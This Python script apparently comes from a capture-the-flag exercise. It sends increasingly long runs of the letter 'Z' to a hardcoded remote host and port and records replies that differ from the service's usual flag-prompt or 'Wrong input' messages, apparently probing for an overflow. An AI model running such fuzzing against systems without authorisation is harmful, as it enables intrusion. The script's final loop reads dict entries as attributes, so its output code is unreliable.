import socket

HOST = "129.241.200.165"
PORT = 3200

DAMN_FLAG = "Trying to print the damn flag!!! \n"
LETTER = "Z"
START = 93_000
END = 100_000

data = b""
failures = 0
timeouts = 0
res_lengths = []
interesting = []

try:
    for i in range(START, END + 1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            s.connect((HOST, PORT))
            spam = LETTER * i + "\n"
            sent = s.send(bytes(spam, "UTF-8"))
            # print(f"{sent=}")
            try:
                data = s.recv(1048576)
            except socket.timeout:
                print(f"timeout i={i}")
                timeouts += 1
                continue
        res = data.decode("UTF-8")
        res_lengths.append(len(res))
        res_letters = res.count(LETTER)
        # filter spam and newlines for easier reading at glance
        short_output = res.replace(LETTER, "").replace("\n", "")
        if res == f"{DAMN_FLAG}" or res == f"{DAMN_FLAG}\nNOOO! Wrong input: {spam}\n":
            failures += 1
            continue
        if res:
            if not "Wrong input" in res:
                interesting.append(
                    {
                        "i": i,
                        "letters": res_letters,
                        "res": res,
                    }
                )
            else:

                print(f"i:{i} letters:{res_letters} res:{short_output}")
except KeyboardInterrupt:
    print("aborted")
finally:
    print(
        f"---completed:\ni:{i} failures:{failures} timeouts:{timeouts} avg_res_length: {sum(res_lengths) / len(res_lengths)}"
    )
    print("interesting:")
    for e in interesting:
        print(f"i:{e.i} letters:{e.letters} res:{e.res}")
